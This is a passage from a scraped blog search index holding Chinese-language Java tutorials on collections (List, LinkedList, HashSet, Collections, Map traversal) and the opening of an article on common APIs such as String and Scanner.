\"java\");//将原索引0位置的元素向后移动一位，将新元素放在索引0的位置 list.add(1, \"world\");//同上 System.out.println(list);//[java, world, hello] System.out.println(list.get(1));//world //System.out.println(list.get(3));//java.lang.IndexOutOfBoundsException System.out.println(list.remove(0));//java System.out.println(list);//[world, hello] System.out.println(list.set(1, \"android\"));//hello System.out.println(list);//[world, android] } } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:4:2","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"List的子类 ArrayList: 底层是数组结构，查询快，增删慢； LinkedList 底层是链表结构，查询慢，增删快。 如何选择使用不同的集合？ 如果查询多，增删少：使用ArrayList 如果查询少，增删多：使用LinkedList 如果不知道使用什么：则使用ArrayList ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:4:3","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"LinkedList的特有功能 void addFirst(E e): 将元素添加到索引为0的位置 示例：list.addFirst(\"java\"); void addLast(E e): 将元素添加到索引为size()-1的位置 示例：list.addLast(\"android\"); E getFirst(): 获取索引为0的元素 示例：System.out.println(list.getFirst());//java E getLast(): 获取索引为size()-1的元素 示例：System.out.println(list.getLast());//android E removeFirst(): 删除索引为0的元素并返回该元素 示例：System.out.println(list.removeFirst());//java E removeLast(): 删除索引为size()-1的元素并返回该元素 示例：System.out.println(list.removeLast());//android LinkedList这些功能的作用： 可以模拟栈和队列的特性 代码示例： import java.util.LinkedList; public class LinkedListDemo { public static void main(String[] args) { LinkedList list = new LinkedList(); list.add(\"hello\"); list.add(\"world\"); System.out.println(list);//[hello, world] list.addFirst(\"java\"); list.addLast(\"android\"); System.out.println(list);//[java, hello, world, android] System.out.println(list.getFirst());//java System.out.println(list.getLast());//android System.out.println(list.removeFirst());//java System.out.println(list.removeLast());//android System.out.println(list);//[hello, world] } } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:4:4","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"番外：由小题目引入源码查阅 题目： 定义一个方法，返回指定列表中指定元素的位置 在1的基础上，定义方法，判断元素是否存在 步骤： 定义index()方法，for循环遍历集合，get获取每个元素，然后equals比较是否与目标相同，并返回相应的Boolean值。 定义contains()方法，调用1的index()获取索引值，然后判断index \u003e= 0是否为真，为真则存在，否则不存在 查阅源码：contains()方法 会发现源码的判断方法，同样是调用索引值的方法，然后判断索引值是否大于等于0 感悟： java源码也并没有多么高深，是一步一步建立起来的 Java源码是代码规范和学习的良好教材，多读多想。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:4:5","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:4:6","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"Set ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:5:0","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"Set接口的特点 无序： 存储和读取的顺序有可能不一样 不允许重复： 要求元素唯一 没有索引 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:5:1","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"HashSet的add()方法添加元素 HashSet的add()方法判断是否重复的原理： 第一步：使用当前集合中的每一个元素和新添加元素的hash值进行比较 如果hash值不一样，则直接添加新的元素； 如果hash值一样，则比较地址值或使用equals方法进行比较 第二步：比较地址值或使用equals方法 如果比较结果一样，则认为是重复不添加 所有比较结果都不一样，则添加 使用HashSet存储自定义对象 以Student为例，每个Student对象的hash值/地址值都不一样，即使姓名+年龄相同，也不会判为重复； 研究add()添加判重复原理之后，可以尝试重写hashCode()和equals()方法 hashCode(): 返回确定值，跳过hash值判断，直接进入equals重写的方法进行姓名/年龄的比较 equals()：分别比较成员变量是否相同 hashCode()和equals()方法的优化： 参考eclipse直接生成的这两个方法 hashCode(): 以上方法中，有一些对象的成员变量完全不同，仍然进行了equals比较，效率较低； 可以让成员变量不同的对象，他们的hash值也不同，可以减少一部分equals比较，从而提高效率 示例:return age + name.hashCode(); equals(): 比较是否为同一个对象，提高效率：if(this == obj) return true; 比较是否为同一类，因为后面有Object向下转型，提高健壮性：if(this.getClass() ! = obj.getClass()) return false; 代码示例： @Override public int hashCode() { final int prime = 31; int result = 1; result = prime * result + age; result = prime * result + ((name == null) ? 0 : name.hashCode()); //加入一些额外的计算，在hash值比较阶段筛掉一些对象 return result; } @Override public boolean equals(Object obj) { //判断是否为同一对象，提高效率 if (this == obj) return true; //判断比较对象是否为空，提高效率 if (obj == null) return false; //判断类型，提高健壮性 if (getClass() != obj.getClass()) return false; Student other = (Student) obj;//向下转型 //比较成员变量的是否一致 if (age != other.age) return false; if (name == null) { if (other.name != null) return false; } else if (!name.equals(other.name)) return false; return true; } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:5:2","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:5:3","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"Collections工具类 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:6:0","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"常见面试题： Collection和Collections有什么区别？ Collection: 集合体系的最顶层，包含了集合体系的共性 Collections: 一个工具类，方法都是用于操作Collection的 工具类不需要创建对象，方法是静态的，直接用类名调用。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:6:1","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"Collections的常见方法 static int binarySearch(List list, T key): 使用二分搜索法搜索指定列表，以获得指定对象。 参数只能是List: 数据要求是有序的 set是无序的，不行；Collection也不行，可能是set 注意： 对象需要是List类型 泛型位置不能是int, 而应该是Integer，因为ArrayList存放的是对象元素 代码示例： import java.util.ArrayList; import java.util.Collections; import java.util.List; public class CollectionsDemo { public static void main(String[] args) { //二分查找 List\u003cInteger\u003e list = new ArrayList\u003cInteger\u003e();//Integer，不是int list.add(1);//自动装箱 list.add(2); list.add(4); list.add(6); int index = Collections.binarySearch(list, 4); System.out.println(index);//2 } } static void copy(List dest, List src): 将所有元素从一个列表复制到另一个列表，即把原列表中的数据覆盖到目标列表。 目标列表在前，源列表在后，不要搞混!! 注意：目标列表的长度至少等于源列表的长度 新建目标列表的长度为空，可以先添加空串或任意内容到目标列表，使其长度大于源列表。 代码示例： public static void main(String[] args) { //copy List\u003cString\u003e src = new ArrayList\u003cString\u003e(); src.add(\"hello\"); src.add(\"world\"); src.add(\"java\"); List\u003cString\u003e dest = new ArrayList\u003cString\u003e(); dest.add(\"\");//为保证目标长度大于源长度，可以添加空串 dest.add(\"\"); dest.add(\"\"); Collections.copy(dest, src); System.out.println(dest);//[hello, world, java] } static void fill(List list, Object obj) 使用指定元素替换指定列表中的所有元素。 代码示例： public static void main(String[] args) { List\u003cString\u003e list = new ArrayList\u003cString\u003e(); list.add(\"hello\"); list.add(\"world\"); list.add(\"java\"); System.out.println(list);//[hello, world, java] Collections.fill(list, \"android\"); System.out.println(list);//[android, android, android] } static void reverse(List list): 反转指定列表中元素的顺序。 代码示例：Collections.reverse(list);//反转后的[1，2，3，4]列表变为[4,3,2,1] static void shuffle(List list): 使用默认随机源对指定列表进行置换。 “傻否”，随机置换：每次运行后的结果可能都不一样。 代码示例: Collections.shuffle(list);//随机置换后的结果为任意排列 static void sort(List list): 根据元素的自然顺序对指定列表按升序进行排序。 注：String类也能排，可能是按首字母对应的int 代码示例：Collections.sort(list); static void swap(List list, int i, int j): 在指定列表的指定位置处交换元素。 代码示例：``Collections.swap(list, 0, 2); 小结： 方法返回值是void: 大概率传入的列表发生了变化 方法返回值是具体的值，非void: 大概率传入的列表没有变化，而是从其中取了某个元素等返回了 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:6:2","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"模拟斗地主发牌 步骤： 买牌：创建存放卡牌的box容器，并将54张牌放入box中； 洗牌：调用Collections的洗牌方法shuffle(); 发牌：(创建三个玩家集合) 遍历box元素，并将这些牌分给三个玩家。 代码示例： import java.util.ArrayList; import java.util.Collections; public class CollectionsTest { public static void main(String[] args) { //买牌 String[] arr = {\"红桃\",\"方块\",\"黑桃\",\"梅花\"}; String[] arr2 = {\"A\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\",\"10\",\"J\",\"Q\",\"K\"}; ArrayList\u003cString\u003e box = new ArrayList\u003cString\u003e(); for(int i = 0; i \u003c arr.length; i++) { for(int j = 0; j \u003c arr2.length; j++) { box.add(arr[i]+arr2[j]); } } box.add(\"大王\"); box.add(\"小王\"); System.out.println(box); System.out.println(box.size());//54 //洗牌 Collections.shuffle(box); //发牌 ArrayList\u003cString\u003e player1 = new ArrayList\u003cString\u003e(); ArrayList\u003cString\u003e player2 = new ArrayList\u003cString\u003e(); ArrayList\u003cString\u003e player3 = new ArrayList\u003cString\u003e(); for(int i = 0; i \u003c box.size()-3; i++) {//留三张底牌给地主 //对取模，余数为0，1，2分别派给三个玩家 if(i % 3 == 0) { player1.add(box.get(i)); }else if(i % 3 == 1) { player2.add(box.get(i)); }else if(i % 3 == 2) { player3.add(box.get(i)); } } //看牌 System.out.println(\"玩家1\"+player1); System.out.println(\"玩家2\"+player2); System.out.println(\"玩家3\"+player3); /* * [红桃A, 红桃2, 红桃3, 红桃4, 红桃5, 红桃6, 红桃7, 红桃8, 红桃9, 红桃10, 红桃J, 红桃Q, 红桃K, 方块A, 方块2, 方块3, 方块4, 方块5, 方块6, 方块7, 方块8, 方块9, 方块10, 方块J, 方块Q, 方块K, 黑桃A, 黑桃2, 黑桃3, 黑桃4, 黑桃5, 黑桃6, 黑桃7, 黑桃8, 黑桃9, 黑桃10, 黑桃J, 黑桃Q, 黑桃K, 梅花A, 梅花2, 梅花3, 梅花4, 梅花5, 梅花6, 梅花7, 梅花8, 梅花9, 梅花10, 梅花J, 梅花Q, 梅花K, 大王, 小王] 54 玩家1[黑桃Q, 梅花J, 方块4, 梅花9, 梅花7, 黑桃10, 方块7, 红桃6, 红桃9, 梅花3, 方块K, 梅花Q, 黑桃3, 黑桃K, 梅花4, 黑桃7, 方块2] 玩家2[梅花6, 红桃10, 方块8, 梅花K, 红桃3, 梅花2, 红桃J, 方块A, 红桃8, 方块6, 大王, 黑桃J, 黑桃2, 小王, 红桃7, 黑桃A, 梅花10] 玩家3[梅花5, 梅花A, 方块5, 方块3, 黑桃5, 黑桃8, 红桃2, 方块J, 黑桃9, 黑桃6, 红桃5, 方块9, 红桃A, 红桃Q, 黑桃4, 方块10, 红桃K] * */ } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:6:3","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:6:4","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"Map ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:7:0","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"Map接口概述 Map: 一种用于存储对应关系的集合 例如：姓名-学号这样的对应关系 Map\u003cK,V\u003e接口： Map接口，独立于Collection的另一种集合形式 将键映射到值的对象。 一个映射不能包含重复的键，每一个键最多只能映射到一个值。 一对一：一个学号对应一个姓名 Map和Collection的区别？ Map: 是一个双列集合，常用于处理有对应关系的集合，key不可以重复 又称为“夫妻对集合”。 Collection: 单列集合 Collection有不同的子体系，有的允许重复有索引有序，有的不允许重复而且无序 又称为“单身汉集合” ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:7:1","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"Map的功能 Map类型对象： 多态创建： 代码示例：Map\u003cString,String\u003e map = new HashMap\u003cString,String\u003e();//创建HashMap对象 输出Map对象：大括号中存放键值对，且键值对用等号连接。 代码示例：System.out.println(map);//{IT002=李四, IT001=王五} 映射功能： V put(K key, V value)： 添加或修改映射关系： 将key值映射到value，如果key存在，则覆盖value，并将原value返回。 返回值： 添加成功返回null，key重复时覆盖并返回key对应的原value值。 代码示例： 添加成功返回null： System.out.println(map.put(\"IT002\", \"李四\"));//null key值重复返回关联的原value值：System.out.println(map.put(\"IT001\", \"王五\"));//张三 获取功能 V get(Object key): 根据指定的key返回对应的value 代码示例：System.out.println(map.get(\"IT001\"));//王五 get与remove：返回值看着差不多，但是get只做了获取的动作，remove是删除后获取，对map集合进行了修改 int size() 返回对应关系的个数 代码示例: System.out.println(map.size());//2 判断功能 boolean containsKey(Object key): 判断某个key值是否存在 代码示例：System.out.println(map.containsKey(\"IT001\"));//true boolean containsValue(Object value): 判断某个value值是否存在 代码示例：System.out.println(map.containsValue(\"张三\"));//false 以上两个功能注意： 键值需要与方法对应，如果判key，传入了value值，也是不匹配的； 特别是键值对类型相同时，注意不要混淆 boolean isEmpty(): 判断是否有对应关系，即判空 注：清空clear()后的map必为空 代码示例：`map.clear(); System.out.println(map.isEmpty());//true 删除功能 void clear(): 清空所有对应关系 代码示例：map.clear(); V remove(Object key): 根据指定的key删除对应关系，并返回key对应的value，如果没有删除成功则返回null 代码示例：System.out.println(map.remove(\"IT001\"));//null 获取所有元素的方法 Set\u003cK\u003e keySet(): 以Set的形式返回所有的key key值不允许重复，所以用Set装正好 注意：Set的泛型是什么类型，需要看定义的key值是什么类型 代码示例：Set\u003cString\u003e keys = map.keySet(); 之后可以用foreach遍历此集合：for (String key : keys) { System.out.println(key); } Collection\u003cV\u003e values() 以Collection的形式返回所有的value值 value值允许重复，因此没有使用Set装 查看values()方法的源码发现：底层并不是List, 因此不能强转为List类型 代码示例：Collection\u003cString\u003e values = map.values(); 之后可以用foreach遍历此集合：for (String value : values) { System.out.println(value); } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:7:2","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"Map的遍历 遍历方法1： 思路： 先获取所有的Key，然后遍历所有Key，并根据每个Key值依次获取对应的value值 涉及方法： map.keySet(); map.get(key); 代码示例： import java.util.HashMap; import java.util.Map; import java.util.Set; public class MapDemo { public static void main(String[] args) { Map\u003cString, String\u003e map = new HashMap\u003cString, String\u003e(); map.put(\"IT001\", \"张三\");//null map.put(\"IT002\", \"李四\");//null map.put(\"IT003\", \"王五\");//张三 System.out.println(map);//{IT002=李四, IT001=王五} Set\u003cString\u003e keys = map.keySet();//获取所有key值 for (String key : keys) {//遍历所有key值，并获取对应的value值 String value = map.get(key); System.out.println(key+\"---\"+value); } } } 遍历方法2： 思路： 偏面向对象思想； 通过entrySet()方法获取映射关系，然后通过映射关系里的getKey()和getValue()方法分别获取键值对的值。 Set\u003cMap.Entry\u003cK,V\u003e\u003e entrySet(): 返回此映射中包含的映射关系的 Set 视图。 包含getKey()和getValue()方法，可以通过此entry对象调用获取对应的键值对的值。 优势： 相比两层for循环，效率提升了很多 代码示例： //entrySet()相当于结婚证对象，通过结婚证对象来获取丈夫和媳妇 class 结婚证\u003cK,V\u003e{ K 丈夫; V 媳妇; } public 结婚证(K 丈夫, V 媳妇){ this.丈夫 = 丈夫; this.媳妇 = 媳妇; } public K get丈夫(){ return 丈夫; } public V get媳妇(){ return 媳妇; } import java.util.HashMap; import java.util.Map; import java.util.Set; public class MapDemo { public static void main(String[] args) { Map\u003cString, String\u003e map = new HashMap\u003cString, String\u003e(); map.put(\"IT001\", \"张三\");//null map.put(\"IT002\", \"李四\");//null map.put(\"IT003\", \"王五\");//张三 System.out.println(map);//{IT002=李四, IT001=王五} Set\u003cMap.Entry\u003cString, String\u003e\u003e entrys = map.entrySet(); for (Map.Entry\u003cString, String\u003e entry : entrys) { String key = entry.getKey(); String value = entry.getValue(); System.out.println(key+\"---\"+value); } } } ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:7:3","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"HashMap存储对象并遍历 字符串对象作为key 同上一节的Map遍历 包含以上两种遍历方法 自定义对象作为key 同样包括两种遍历方法 不同点： 以Student为例: new Student(\"张三\",18);与new Student(\"张三\",18); Key值需要具有唯一性，自定义对象作为key值时，默认的方法不会判定成员变量相同的为重复(new了不同的对象) 解决方法：与之前类似，定义对象的代码中重写hashCode(), equals()方法 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:7:4","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:7:5","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"END ","date":"2024-03-25","objectID":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/:7:6","tags":["Java","语法"],"title":"Java集合与数据结构","uri":"/articles/2024/03/java%E9%9B%86%E5%90%88%E4%B8%8E%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"categories":["Java"],"content":"目录 API概述: API概述，Scanner获取字符串 String类: String概述, 构造方法(4种)及对比, 判断功能(4种), 获取功能(5种), 转换功能(3种), 其他功能(2种), 相关典型问题 StringBuilder: 和String的区别, 特点和优势, 构造方法, 功能(查询添加反转), 和String相互转换, 典型问题(字符串反转, 回文串), StringBuffer 对象数组的练习: eclipse自动生成构造函数、get()/set()方法 集合类与ArrayList: 集合类概述, ArrayList概述, 构造方法, 添加/增删改查/遍历的方法 ArrayList案例分析: 获取满足要求的元素, 存储自定义对象并遍历, 键盘录入数据存储并遍历 集合版学生管理系统: 学生类增删改查练习，含完整代码，篇幅较长可选择性跳过 IO流: 概述IO流, FileWriter构造方法, 写数据方法, 换行, 追加写入, FileReader, 读数据方法(单个字符/字符数组), 字符缓冲流及特殊方法, 复制文本的5种方法, 集合数据的读写 IO流版学生管理系统: 用IO流改进学生管理系统 Object: 概述, 重写toString 和 equals方法 System: 概述, arraycopy(…), currentTimeMillis(), exit(int status), gc() Date: 概述, 构造方法, setTime(long time), getTime() DateFormat: 概述, 格式化format方法, 解析parse方法, 构造方法, 指定模式字母 Calendar: 概述, 创建, 获取get方法, 修改set方法, 添加add方法 包装类: 概述, 组成, Integer的构造和转换 自动装箱和拆箱: 概述, 装拆示例 正则表达式: 概述, 常用规则, qq号码判断示例 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:0:1","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"API概述 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:1:0","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"定义 API(Application Programming Interface)：应用程序编程接口 类似于厂商已经定义好，现在直接提供给我们使用的类 我们只需要了解如何使用这些类即可 Java API指的就是JDK中提供的各种功能的Java类。 这些类将底层的实现封装了起来 不需要关心这些类是如何实现的，只需要学习这些类如何使用。 可以通过查帮助文档来了解Java提供的API如何使用 相当于厂商Java给定义好的类的说明书 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:1:1","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"API使用 (以Random为例) 1:打开帮助文档。 2:点击显示，找到索引，看到输入框。 3:在搜索框中里面输入需要学习的内容。 举例：Random 4:看包：”java.lang包“下的类在使用的时候是不需要导包的，其他均需要。 5:看类的描述： Random类是用于生成随机数的类 6:看构造方法： Random():无参构造方法 – Random r = new Random(); 7:看成员方法 public int nextInt(int n): 产生的是一个[0,n)范围内的随机数 8:调用方法： 看返回值类型：返回什么类型，就用什么类型接收 看方法名：名字不要写错了 看形式参数：要几个参数，就给几个，要什么数据类型的，就给什么数据类型的 示例：根据第7点 成员方法的形式，给出调用 int number = r.nextInt(100); ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:1:2","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"Scanner获取字符串 Scanner: 用于获取键盘录入的数据（基本数据类型，字符串类型） public String nextLine(): 获取键盘录入的字符串数据 接受String数据：String s = sc.nextLine(); //获取键盘录入的字符串数据 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:1:3","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"返回目录 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:1:4","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"String类 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:2:0","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"String类概述 lang包中的类 字符串是由多个字符组成的一串数据，字符串可以看成是”字符数组“ 字符串是一种比较特殊的引用数据类型，直接输出字符串对象输出的是该对象中的数据(即字符串数据，而不是地址值)。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:2:1","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"构造方法：通过构造方法创建字符串对象的4种方法 方式1：public String(String original) 把字符串数据original封装成字符串对象 示例：String s1 = new String(\"helloworld\");//s1=hello 方式2：public String(char[] value) 把字符数组value的数据封装成字符串对象 char[] chs = {'h','e','l','l','o'}; String s2 = new String(chs);//s2=hello 方式3：public String(char[] value,int index,int count) 把字符数组value中的一部分数据封装成字符串对象，index是开始的索引，count是截取的长度(即字符串长度)。 char[] chs = {'h','e','l','l','o'}; String s3 = new String(chs, 0, chs.length);//s3=hello String s3 = new String(chs, 1, 3);//s3=ell 方式4：直接赋值也可以是一个对象 \u003c最简单最常用\u003e String s4 = \"hello\";//s4=hello ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:2:2","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"String创建的两种方法对比 通过构造方法创建字符串对象和直接赋值创建字符串对象的区别： 通过构造方法创建字符串对象： String s1 = new String(\"hello\"); 直接赋值创建字符串对象 String s2 = \"hello\"; String s3 = \"hello\"; ==: 基本数据类型：比较的是基本数据类型的值是否相等。 引用数据类型：比较的是引用数据类型的地址值是否相等。 比较结果：s1==s2:false; s1==s3:false; s2==s3:true; 两种构造方法生成的字符串内容(“hello”)：都存储在方法区的常量池中，为了方便字符串的重复使用。 s1: new存入堆内存中地址值为001并开辟空间，而这个空间里存的不是\"hello\", 而是这个字符串在方法区的常量池中的地址值002 直接赋值：存储在常量池。 多次直接赋值：将存储在常量池中的\"hello\"的地址传递给s变量，且常量池已有的字符串公用。 总结： 通过构造方法创建字符串对象是在堆内存； 通过直接赋值创建对象是在方法区的常量池 \u003c方便字符串的重复使用\u003e。 图解 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:2:3","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"Object类 Object是类层次结构的根类，所有的类都直接或间接继承自该类。 如果一个方法的形式参数是Object，即表示可以传递它的任意子类。 String是Object的子类。 ","date":"2024-03-25","objectID":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/:2:4","tags":["Java","语法"],"title":"Java常用api","uri":"/articles/2024/03/java%E5%B8%B8%E7%94%A8api/"},{"categories":["Java"],"content":"String的判断功能 boolean equals(Object obj)： 功能：比较字符串的内容是否相同，严格区分大小写。 与\"==“区别(比较地址值)，且本方法可以重写。 示例： 定义字符串：s1 = \"hello;\",s2=\"hello;\",s3=\"Hello.\"//大小写的不同 判断：Boolean b1 = s1.equals(s2);//true,Boolean b2 = s1.equals(s3);//false boolean equalsIgnoreCase(String str) 功能：比较字符串的内容是否相同，且忽略大小写。 示例： 判断：Boolean b1 = 